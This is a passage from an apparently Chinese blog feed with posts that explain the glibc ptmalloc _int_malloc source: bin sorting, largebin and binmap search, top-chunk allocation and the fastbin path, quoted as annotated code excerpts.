class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">static void * _int_malloc(mstate av, size_t bytes) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    for (;;) &#123;</div><div class="line">        int iters = 0;</div><div class="line">        while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))&#123;</div><div class="line"></div><div class="line">            ...</div><div class="line"></div><div class="line">            if (in_smallbin_range(size)) &#123;</div><div class="line">                victim_index = smallbin_index(size);</div><div class="line">                bck = bin_at (av, victim_index);</div><div class="line">                fwd = bck-&gt;fd;</div><div class="line">            &#125; else &#123;</div><div class="line">                victim_index = largebin_index(size);</div><div class="line">                bck = bin_at (av, victim_index);</div><div class="line">                fwd = bck-&gt;fd;</div><div class="line"></div><div class="line">                if (fwd != bck) &#123;</div><div class="line">                    size |= PREV_INUSE;</div><div class="line">                    assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0);</div><div class="line">                    if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)) &#123;</div><div class="line">                        fwd = bck;</div><div class="line">                        bck = bck-&gt;bk;</div><div class="line"></div><div class="line">                        victim-&gt;fd_nextsize = fwd-&gt;fd;</div><div class="line">                        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</div><div class="line">                        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize =</div><div class="line">                                victim;</div><div class="line">                    &#125; else &#123;</div><div class="line">                        assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);</div><div class="line">                        while ((unsigned long) size &lt; fwd-&gt;size) &#123;</div><div class="line">                            fwd = fwd-&gt;fd_nextsize;</div><div class="line">                            assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);</div><div class="line">                        &#125;</div><div class="line"></div><div class="line">                        if ((unsigned long) size == (unsigned long) fwd-&gt;size)</div><div class="line">                            fwd = fwd-&gt;fd;</div><div class="line">                        else &#123;</div><div class="line">                            victim-&gt;fd_nextsize = fwd;</div><div class="line">                            victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</div><div class="line">                            fwd-&gt;bk_nextsize = victim;</div><div class="line">                            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</div><div class="line">                        &#125;</div><div class="line">                        bck = fwd-&gt;bk;</div><div class="line">                    &#125;</div><div class="line">                &#125; else</div><div class="line">                    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            mark_bin(av, victim_index);</div><div class="line">            victim-&gt;bk = bck;</div><div class="line">            victim-&gt;fd = fwd;</div><div class="line">            fwd-&gt;bk = victim;</div><div class="line">            bck-&gt;fd = victim;</div><div class="line"></div><div class="line">    #define MAX_ITERS       10000</div><div class="line">            if (++iters &gt;= MAX_ITERS)</div><div class="line">                break;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这部分代码的整体意思是如果从unsortedbin中取出的chunk不符合用户要求的大小，就将该chunk合并到smallbin或者largebin中。<br>首先如果取出的chunk（victim）属于smallbin，就通过<code>smallbin_index</code>计算需要插入的位置<code>victim_index</code>，然后获取smallbin中对应位置的链表头指针保存在<code>bck</code>中，最后直接插入到smallbin中，由于smallbin中的chunk不使用<code>fd_nextsize</code>和<code>bk_nextsize</code>指针，插入操作只需要更新<code>bk</code>和<code>fd</code>指针，具体的插入操作在后面。这里需解释一下，<code>fd_nextsize</code>指针指向的是chunk双向链表中下一个大小不同的chunk，<code>bk_nextsize</code>指向的是chunk双向链表中前一个大小不同的chunk。<br>如果取出的chunk（victim）属于largebin，通过<code>largebin_index</code>计算需要插入的位置<code>victim_index</code>，然后获取largebin链表头指针保存在<code>bck</code>中。<br>如果<code>fwd</code>等于<code>bck</code>，即<code>bck-&gt;fd=bck</code>，则表示largebin中对应位置上的chunk双向链表为空，直接进入后面的else部分中，代码<code>victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim</code>表示插入到largebin中的victim是唯一的chunk，因此其<code>fd_nextsize</code>和<code>bk_nextsize</code>指针都指向自己。<br>如果<code>fwd</code>不等于<code>bck</code>，对应的chunk双向链表存在空闲chunk，这时就要在该链表中找到合适的位置插入了。因为largebin中的chunk链表是按照chunk大小从大到小排序的，如果<code>victim</code>的<code>size</code>小于<code>bck-&gt;bk-&gt;size</code>即最后一个chunk的大小，则表示即将插入<code>victim</code>的大小在largebin的chunk双向链表中是最小的，因此要把<code>victim</code>插入到该链表的最后。在这种情况下，经过操作后的结果如下所示（因为我手边的画图软件有限，这里就用符号“|”隔出数组，然后从代码中摘除核心的<code>fd_nextsize</code>和<code>bk_nextsize</code>指针的修改操作，对照这两个指针的意思，很容易看懂），</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">| fwd（头指针） | fwd-&gt;fd | ... | bck | victim（插入到末尾） |</div><div class="line">fwd-&gt;fd-&gt;bk_nextsize = victim</div><div class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim</div><div class="line">victim-&gt;fd_nextsize = fwd-&gt;fd</div><div class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize</div></pre></td></tr></table></figure>
<p>如果要插入的<code>victim</code>的<code>size</code>不是最小的，就要通过一个while循环遍历找到合适的位置，这里是从双向链表头<code>bck-&gt;fd</code>开始遍历，利用<code>fd_nextsize</code>加快遍历的速度，找到第一个<code>size&gt;=fwd-&gt;size</code>的chunk。如果<code>size=fwd-&gt;size</code>，就只是改变<code>victim</code>以及前后相应chunk的<code>bk</code>、<code>fd</code>指针就行。这里要特别注意，先做一个假设，假设chunk双向链表中A、B、C是三个不同大小的chunk集合，A集合有A0=A1=…，B集合有B0=B1=…，C集合有C0=C1=…，然后构造chunk链表，<br>| A0 | A1 | A2 | B0 | B1 | B2 | C0 | C1 | C2 |<br>特别注意，在ptmalloc中，只有A0、B0、C0可以配置<code>fd_nextsize</code>和<code>bk_nextsize</code>指针，其他位置是不用配置这两个指针的。因此相同大小的chunk只有最低地址的chunk会设置<code>fd_nextsize</code>和<code>bk_nextsize</code>指针。根据这个假设，很容易知道当两个size相等时，为什么要执行<code>fwd = fwd-&gt;fd</code>，因为要保证插入victim的位置是相同大小的chunk的右边，即高地址的地方。插入后的链表如下，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">...| bck | victim | fwd |...</div></pre></td></tr></table></figure>
<p>链表中所有chunk的<code>fd_nextsize</code> 和<code>bk_nextsize</code>指针不变。<br>再往下，如果<code>size</code>不相等，则直接插入在<code>fwd</code>的左边，这样也能保证所有的<code>fd_nextsize</code>和<code>bk_nextsize</code>指针设置在相同chunk大小的最地地址处（最左边）。插入后的链表如下，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">...| bck | victim | fwd |...</div><div class="line">victim-&gt;fd_nextsize = fwd</div><div class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</div><div class="line">fwd-&gt;bk_nextsize = victim</div><div class="line">fwd-&gt;bk_nextsize-&gt;fd_nextsize = victim</div></pre></td></tr></table></figure>
<p>再往下，<code>mark_bin</code>用来标识<code>malloc_state</code>中的<code>binmap</code>，标识相应位置的chunk空闲。然后就更改<code>fd</code>、<code>bk</code>指针，插入到双向链表中，这个插入操作同时适用于smallbin和largebin，因此放在这里。最后如果在unsortedbin中处理了超过10000个chunk，就直接退出循环，这里保证不会因为unsortedbin中chunk太多，处理的时间太长了。<br>在这部分代码中，有个<code>size |= PREV_INUSE</code>是暂时让我比较费解的地方，经过分析后，暂时认为<code>size |= PREV_INUSE</code>是没必要的，虽然不会产生错误，也不会影响largebin中的排序，并且注释说这行代码能加速排序，但没看出能加速的地方，经过分析这里反而会多出一个无效的指针赋值，希望往后看代码时能解决这里的问题，或者希望有人能解答这行代码的具体作用。</p>
<p>回到<code>_int_malloc</code>函数中，继续往下看，为了使整个代码结构清晰，这里继续保留了外层的for循环。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line">static void * _int_malloc(mstate av, size_t bytes) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    for (;;) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">        if (!in_smallbin_range(nb)) &#123;</div><div class="line">            bin = bin_at (av, idx);</div><div class="line"></div><div class="line">            if ((victim = first(bin)) != bin</div><div class="line">                    &amp;&amp; (unsigned long) (victim-&gt;size) &gt;= (unsigned long) (nb)) &#123;</div><div class="line">                victim = victim-&gt;bk_nextsize;</div><div class="line">                while (((unsigned long) (size = chunksize(victim))</div><div class="line">                        &lt; (unsigned long) (nb)))</div><div class="line">                    victim = victim-&gt;bk_nextsize;</div><div class="line"></div><div class="line">                if (victim != last(bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</div><div class="line">                    victim = victim-&gt;fd;</div><div class="line"></div><div class="line">                remainder_size = size - nb;</div><div class="line">                unlink(av, victim, bck, fwd);</div><div class="line"></div><div class="line">                if (remainder_size &lt; MINSIZE) &#123;</div><div class="line">                    set_inuse_bit_at_offset(victim, size);</div><div class="line">                    if (av != &amp;main_arena)</div><div class="line">                        victim-&gt;size |= NON_MAIN_ARENA;</div><div class="line">                &#125;</div><div class="line">                else &#123;</div><div class="line">                    remainder = chunk_at_offset(victim, nb);</div><div class="line">                    bck = unsorted_chunks (av);</div><div class="line">                    fwd = bck-&gt;fd;</div><div class="line">                    if (__glibc_unlikely(fwd-&gt;bk != bck)) &#123;</div><div class="line">                        errstr = &quot;malloc(): corrupted unsorted chunks&quot;;</div><div class="line">                        goto errout;</div><div class="line">                    &#125;</div><div class="line">                    remainder-&gt;bk = bck;</div><div class="line">                    remainder-&gt;fd = fwd;</div><div class="line">                    bck-&gt;fd = remainder;</div><div class="line">                    fwd-&gt;bk = remainder;</div><div class="line">                    if (!in_smallbin_range(remainder_size)) &#123;</div><div class="line">                        remainder-&gt;fd_nextsize = NULL;</div><div class="line">                        remainder-&gt;bk_nextsize = NULL;</div><div class="line">                    &#125;</div><div class="line">                    set_head(victim,</div><div class="line">                            nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</div><div class="line">                    set_head(remainder, remainder_size | PREV_INUSE);</div><div class="line">                    set_foot(remainder, remainder_size);</div><div class="line">                &#125;</div><div class="line">                check_malloced_chunk (av, victim, nb);</div><div class="line">                void *p = chunk2mem(victim);</div><div class="line">                alloc_perturb(p, bytes);</div><div class="line">                return p;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这部分代码的整体意思就是要尝试从largebin中取出对应的chunk了。<br>这里的<code>idx</code>是在前面（上一章分析的<code>_int_malloc</code>函数前面一部分中）根据宏<code>largebin_index</code>计算的。接下来就要根据<code>idx</code>获得largebin中的双向链表头指针<code>bin</code>，然后从<code>bin-&gt;bk</code>开始从尾到头（根据chunk大小从小到大）遍历整个双向链表，找到第一个大于用户需要分配的chunk大小<code>nb</code>的chunk指针<code>victim</code>。<br>找到<code>victim</code>后，需要将其拆开成两部分，第一部分是要返回给用户的chunk，第二部分分为两种情况，如果其大小小于<code>MINSIZE</code>，则不能构成一个最小chunk，这种情况下就将拆开前的整个<code>victim</code>返回给用户；如果大于<code>MINSIZE</code>，就将拆开后的第二部分<code>remainder</code>插入到unsortedbin中，然后把第一部分<code>victim</code>返回给用户。</p>
<p>继续往下看<code>_int_malloc</code>函数，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line">static void * _int_malloc(mstate av, size_t bytes) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    for (;;) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">        ++idx;</div><div class="line">        bin = bin_at (av, idx);</div><div class="line">        block = idx2block(idx);</div><div class="line">        map = av-&gt;binmap[block];</div><div class="line">        bit = idx2bit(idx);</div><div class="line"></div><div class="line">        for (;;) &#123;</div><div class="line">            if (bit &gt; map || bit == 0) &#123;</div><div class="line">                do &#123;</div><div class="line">                    if (++block &gt;= BINMAPSIZE) /* out of bins */</div><div class="line">                        goto use_top;</div><div class="line">                &#125; while ((map = av-&gt;binmap[block]) == 0);</div><div class="line"></div><div class="line">                bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</div><div class="line">                bit = 1;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            while ((bit &amp; map) == 0) &#123;</div><div class="line">                bin = next_bin(bin);</div><div class="line">                bit &lt;&lt;= 1;</div><div class="line">                assert(bit != 0);</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            victim = last(bin);</div><div class="line">            if (victim == bin) &#123;</div><div class="line">                av-&gt;binmap[block] = map &amp;= ~bit;</div><div class="line">                bin = next_bin(bin);</div><div class="line">                bit &lt;&lt;= 1;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            else &#123;</div><div class="line">                size = chunksize(victim);</div><div class="line">                assert((unsigned long ) (size) &gt;= (unsigned long ) (nb));</div><div class="line">                remainder_size = size - nb;</div><div class="line">                unlink(av, victim, bck, fwd);</div><div class="line">                if (remainder_size &lt; MINSIZE) &#123;</div><div class="line">                    set_inuse_bit_at_offset(victim, size);</div><div class="line">                    if (av != &amp;main_arena)</div><div class="line">                        victim-&gt;size |= NON_MAIN_ARENA;</div><div class="line">                &#125;</div><div class="line">                else &#123;</div><div class="line">                    remainder = chunk_at_offset(victim, nb);</div><div class="line">                    bck = unsorted_chunks (av);</div><div class="line">                    fwd = bck-&gt;fd;</div><div class="line">                    if (__glibc_unlikely(fwd-&gt;bk != bck)) &#123;</div><div class="line">                        errstr = &quot;malloc(): corrupted unsorted chunks 2&quot;;</div><div class="line">                        goto errout;</div><div class="line">                    &#125;</div><div class="line">                    remainder-&gt;bk = bck;</div><div class="line">                    remainder-&gt;fd = fwd;</div><div class="line">                    bck-&gt;fd = remainder;</div><div class="line">                    fwd-&gt;bk = remainder;</div><div class="line"></div><div class="line">                    if (in_smallbin_range(nb))</div><div class="line">                        av-&gt;last_remainder = remainder;</div><div class="line">                    if (!in_smallbin_range(remainder_size)) &#123;</div><div class="line">                        remainder-&gt;fd_nextsize = NULL;</div><div class="line">                        remainder-&gt;bk_nextsize = NULL;</div><div class="line">                    &#125;</div><div class="line">                    set_head(victim,</div><div class="line">                            nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</div><div class="line">                    set_head(remainder, remainder_size | PREV_INUSE);</div><div class="line">                    set_foot(remainder, remainder_size);</div><div class="line">                &#125;check_malloced_chunk (av, victim, nb);</div><div class="line">                void *p = chunk2mem(victim);</div><div class="line">                alloc_perturb(p, bytes);</div><div class="line">                return p;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这一部分的整体意思是，前面在largebin中寻找特定大小的空闲chunk，如果没找到，这里就要遍历largebin中的其他更大的chunk双向链表，继续寻找。<br>开头的<code>++idx</code>就表示，这里要从largebin中下一个更大的chunk双向链表开始遍历。ptmalloc中用一个bit表示<code>malloc_state</code>的<code>bins</code>数组中对应的位置上是否有空闲chunk，bit为1表示有，为0则没有。ptmalloc通过4个block（一个block 4字节）一共128个bit管理<code>bins</code>数组。因此，代码中计算的block表示对应的<code>idx</code>属于哪一个block，<code>map</code>就表是block对应的bit组成的二进制数字。<br>接下来进入for循环，如果<code>bit &gt; map</code>，表示该<code>map</code>对应的整个<code>block</code>里都没有大于<code>bit</code>位置的空闲的chunk，因此就要找下一个<code>block</code>。因为后面的<code>block</code>只要不等于0，就肯定有空闲chunk，并且其大小大于<code>bit</code>位置对应的chunk，下面就根据<code>block</code>，取出<code>block</code>对应的第一个双向链表的头指针。这里也可以看出，设置<code>map</code>和<code>block</code>也是为了加快查找的速度。如果遍历完所有<code>block</code>都没有空闲chunk，这时只能从top chunk里分配chunk了，因此跳转到<code>use_top</code>。<br>如果有空闲chunk，接下来就通过一个while循环依次比较找出到底在哪个双向链表里存在空闲chunk，最后获得空闲chunk所在的双向链表的头指针<code>bin</code>和位置<code>bit</code>。<br>接下来，如果找到的双向链表又为空，则继续前面的遍历，找到空闲chunk所在的双向链表的头指针<code>bin</code>和位置<code>bit</code>。如果找到的双向链表不为空，就和上面一部分再largebin中找到空闲chunk的操作一样了，这里就不继续分析了。</p>
<p>继续往下看<code>_int_malloc</code>，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">static void * _int_malloc(mstate av, size_t bytes) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    for (;;) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">        use_top:</div><div class="line"></div><div class="line">        victim = av-&gt;top;</div><div class="line">        size = chunksize(victim);</div><div class="line"></div><div class="line">        if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE )) &#123;</div><div class="line">            remainder_size = size - nb;</div><div class="line">            remainder = chunk_at_offset(victim, nb);</div><div class="line">            av-&gt;top = remainder;</div><div class="line">            set_head(victim,</div><div class="line">                    nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</div><div class="line">            set_head(remainder, remainder_size | PREV_INUSE);</div><div class="line"></div><div class="line">            check_malloced_chunk (av, victim, nb);</div><div class="line">            void *p = chunk2mem(victim);</div><div class="line">            alloc_perturb(p, bytes);</div><div class="line">            return p;</div><div class="line">        &#125;</div><div class="line">        else if (have_fastchunks(av)) &#123;</div><div class="line">            malloc_consolidate(av);</div><div class="line">            if (in_smallbin_range(nb))</div><div class="line">                idx = smallbin_index(nb);</div><div class="line">            else</div><div class="line">                idx = largebin_index(nb);</div><div class="line">        &#125;</div><div class="line">        else &#123;</div><div class="line">            void *p = sysmalloc(nb, av);</div><div class="line">            if (p != NULL)</div><div class="line">                alloc_perturb(p, bytes);</div><div class="line">            return p;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里就是<code>_int_malloc</code>的最后一部分了，这部分代码的整体意思分为三部分，首先从top chunk中尝试分配内存；如果失败，就检查fastbin中是否有空闲内存了（其他线程此时可能将释放的chunk放入fastbin中了），如果不空闲，就合并fastbin中的空闲chunk并放入smallbin或者largebin中，然后会回到<code>_int_malloc</code>函数中最前面的for循环，重新开始查找空闲chunk；如果连fastbin中都没有空闲内存了，这时只能通过<code>sysmalloc</code>从系统分配内存了，该函数前面几章里已经分析过了一部分了，下一章会再次进入这个函数进行分析。这部分代码很简单，关键函数前面几章都碰到过了，这里就不详细分析了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>下面简单总结一遍<code>_int_malloc</code>函数的整体思路。<br>第一步：如果进程没有关联的分配区，就通过<code>sysmalloc</code>从操作系统分配内存。<br>第二步：从fastbin查找对应大小的chunk并返回，如果失败进入第三步。<br>第三步：从smallbin查找对应大小的chunk并返回，或者将fastbin中的空闲chunk合并放入unsortedbin中，如果失败进入第四步。<br>第四步：遍历unsortedbin，从unsortedbin中查找对应大小的chunk并返回，根据大小将unsortedbin中的空闲chunk插入smallbin或者largebin中。进入第五步。<br>第五步：从largebin指定位置查找对应大小的chunk并返回，如果失败进入第六步。<br>第六步：从largebin中大于指定位置的双向链表中查找对应大小的chunk并返回，如果失败进入第七步。<br>第七步：从topchunk中分配对应大小的chunk并返回，topchunk中没有足够的空间，就查找fastbin中是否有空闲chunk，如果有，就合并fastbin中的chunk并加入到unsortedbin中，然后跳回第四步。如果fastbin中没有空闲chunk，就通过<code>sysmalloc</code>从操作系统分配内存。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;malloc源码分析—-int-malloc&quot;&gt;&lt;a href=&quot;#malloc源码分析—-int-malloc&quot; class=&quot;headerlink&quot; title=&quot;malloc源码分析—_int_malloc&quot;&gt;&lt;/a&gt;malloc源码分析—_int_mall
    
    </summary>
    
      <category term="pwn" scheme="http://yoursite.com/categories/pwn/"/>
    
    
      <category term="heap" scheme="http://yoursite.com/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>malloc源码分析——3</title>
    <link href="http://yoursite.com/2018/05/21/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%943/"/>
    <id>http://yoursite.com/2018/05/21/malloc源码分析——3/</id>
    <published>2018-05-21T06:40:59.000Z</published>
    <updated>2018-05-21T06:52:18.058Z</updated>
    
    <content type="html"><![CDATA[<h1 id="malloc源码分析—-int-malloc"><a href="#malloc源码分析—-int-malloc" class="headerlink" title="malloc源码分析—_int_malloc"></a>malloc源码分析—_int_malloc</h1><p>上一章分析了<code>_int_malloc</code>的前面一小部分，本章继续往下看，</p>
<h1 id="int-malloc-—-fastbin"><a href="#int-malloc-—-fastbin" class="headerlink" title="_int_malloc — fastbin"></a>_int_malloc — fastbin</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">static void * _int_malloc(mstate av, size_t bytes) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ())) &#123;</div><div class="line">        idx = fastbin_index(nb);</div><div class="line">        mfastbinptr *fb = &amp;fastbin(av, idx);</div><div class="line">        mchunkptr pp = *fb;</div><div class="line">        do &#123;</div><div class="line">            victim = pp;</div><div class="line">            if (victim == NULL)</div><div class="line">                break;</div><div class="line">        &#125; while ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd, victim))</div><div class="line">                != victim);</div><div class="line">        if (victim != 0) &#123;</div><div class="line">            if (__builtin_expect(fastbin_index (chunksize (victim)) != idx, 0)) &#123;</div><div class="line">                errstr = &quot;malloc(): memory corruption (fast)&quot;;</div><div class="line">                errout: malloc_printerr(check_action, errstr, chunk2mem(victim),</div><div class="line">                        av);</div><div class="line">                return NULL;</div><div class="line">            &#125;check_remalloced_chunk (av, victim, nb);</div><div class="line">            void *p = chunk2mem(victim);</div><div class="line">            alloc_perturb(p, bytes);</div><div class="line">            return p;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>get_max_fast</code>返回fastbin可以存储内存的最大值，它在ptmalloc的初始化函数<code>malloc_init_state</code>中定义，后面会分析这个函数。<br>如果需要分配的内存大小nb落在fastbin的范围内，首先调用<code>fastbin_index</code>获得chunk大小<code>nb</code>对应的fastbin索引。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#define fastbin_index(sz) \</div><div class="line">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</div></pre></td></tr></table></figure>
<p>减2是根据fastbin存储的内存最小值计算的，本章假设<code>SIZE_SZ=4</code>，因此改写后<code>idx = nb/8-2</code>。<br>获得索引idx后，就通过fastbin取出空闲chunk链表指针，<code>mfastbinptr</code>其实就是<code>malloc_chunk</code>指针，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#define fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</div></pre></td></tr></table></figure>
<p>下面的do、while循环又是一个CAS操作，其作用是从刚刚得到的空闲chunk链表指针中取出第一个空闲的chunk(victim)，并将链表头设置为该空闲chunk的下一个chunk(victim-&gt;fd)。这里注意，fastbin中使用的是单链表，而后面smallbin使用的是双链表。<br>获得空闲chunk后，需要转换为可以存储的内存指针，<code>chunk2mem</code>上一章分析过了，就是返回<code>malloc_chunk</code>结构中fd所在的位置，因为当一个chunk被使用时，<code>malloc_chunk</code>结构中<code>fd</code>、<code>bk</code>包括后面的变量都没有用了。最后调用<code>alloc_perturb</code>对用户使用的内存进行初始化，然后就返回该内存的指针了。<br>假设fastbin中没有找到空闲chunk，或者fastbin根本没有初始化，或者其他原因，就进入下一步，从smallbin中获取内存，因此继续往下看.</p>
<h1 id="int-malloc-—-smallbin-amp-largebin"><a href="#int-malloc-—-smallbin-amp-largebin" class="headerlink" title="_int_malloc — smallbin &amp; largebin"></a>_int_malloc — smallbin &amp; largebin</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div 